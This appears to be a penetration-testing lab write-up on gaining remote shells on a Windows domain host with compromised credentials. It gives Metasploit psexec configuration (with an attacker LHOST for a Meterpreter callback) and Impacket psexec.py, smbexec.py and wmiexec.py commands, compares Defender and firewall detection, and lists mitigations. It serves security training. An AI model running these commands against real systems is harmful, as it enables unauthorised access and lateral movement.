
# Remote Shell Access via Valid Credentials

**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter)
**Related Techniques:** T1021 (Remote Services), T1569.002 (Service Execution)

---

## 1. Objective

Demonstrate remote code execution using previously compromised credentials and evaluate how different tools interact with Windows Defender and host firewall protections.

This phase validates post-credential compromise execution capabilities in a domain environment.

---

## 2. Lab Context

* Valid domain credentials obtained from previous attacks
* Target: Windows 10 domain-joined host
* Windows Defender initially enabled
* Windows Defender Firewall enabled

The goal was to compare detection behavior across multiple execution tools.

---

## 3. Test 1 — Metasploit psexec Module

### Tool Used

Metasploit Framework
Module:

```
exploit/windows/smb/psexec
```

---

### Configuration Steps

```bash
msfconsole
search psexec
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set LHOST <attacker_ip>
set SMBUser <username>
set SMBPass <password>
show targets
set target 2   # Native Upload
run
```

---

### Result (Defender Enabled)

Windows Defender detected and blocked the payload.

📸 Screenshots:

* `screenshots/w-defender-detect-attack.png`
* `screenshots/w-defender-detect-attack-msf-failed.png`

---

### Result (Defender Disabled)

After disabling Defender:

* Meterpreter session successfully established

📸 Screenshot:

* `screenshots/w-defender-off-msf-success.png`

---

## 4. Test 2 — Impacket psexec.py

### Execution

```bash
psexec.py SPECTRA.local/dadam:Password1@<target_ip>
```

Result:

* Remote shell successfully obtained
* Windows Defender did NOT block execution

📸 Screenshot:

* `screenshots/psexec.py-root-shell.png`
* `psexec-session.txt`

---

### Why It Worked

Impacket’s implementation:

* Uses SMB service creation
* Does not rely on a known malicious payload signature like Meterpreter
* Often bypasses signature-based AV detection

---

## 5. Test 3 — smbexec.py

```bash
smbexec.py SPECTRA.local/dadam:Password1@<target_ip>
```

Result:

* Semi-interactive shell obtained
* Required Windows Defender Firewall to be disabled

📸 Screenshot:

* `screenshots/smbexec.py-root-shell.png`
* `smbexec-session.txt`

---

## 6. Test 4 — wmiexec.py

```bash
wmiexec.py SPECTRA.local/dadam:Password1@<target_ip>
```

Result:

* Semi-interactive shell obtained
* Firewall restrictions affected connectivity

📸 Screenshot:

* `screenshots/wmiexec.py-root-shell.png`
* `wmiexec-session.txt`

---

## 7. Observations & Analysis

| Tool              | Defender On | Defender Off | Firewall Impact       |
| ----------------- | ----------- | ------------ | --------------------- |
| Metasploit psexec | ❌ Blocked   | ✅ Success    | Minimal               |
| psexec.py         | ✅ Success   | ✅ Success    | Minimal               |
| smbexec.py        | ⚠ Partial   | ✅ Success    | Required firewall off |
| wmiexec.py        | ⚠ Partial   | ✅ Success    | Required firewall off |

---

## 8. Key Technical Insight

Antivirus does not block credential-based remote service creation consistently.

Differences observed:

* Signature-based payloads (Meterpreter) → More likely to be detected
* Native Windows service execution (Impacket tools) → Often bypass basic AV
* Firewall rules significantly influence remote execution success

This demonstrates that:

> Valid credentials are often more powerful than exploits.

Even with Defender enabled, certain legitimate administrative protocols can still be abused.

---

## 9. Business Impact

If an attacker obtains valid domain credentials:

* Remote command execution is highly likely
* Lateral movement becomes trivial
* AV alone does not prevent compromise
* Firewall misconfigurations increase risk

Credential theft + remote service execution = high-risk enterprise exposure.

---

## 10. Defensive Mitigation

* Enforce least privilege
* Remove local admin rights from domain users
* Enforce SMB signing
* Monitor for suspicious service creation events (Event ID 7045)
* Monitor for abnormal WMI activity
* Enable Attack Surface Reduction (ASR) rules
* Restrict lateral movement with segmentation
* Use Privileged Access Workstations (PAWs)

---

## 11. Skills Demonstrated

* Remote service execution
* Tool comparison and behavioral analysis
* AV evasion observation (not bypass development)
* Windows service abuse
* WMI abuse
* Firewall impact analysis
* Execution phase mapping in MITRE

---
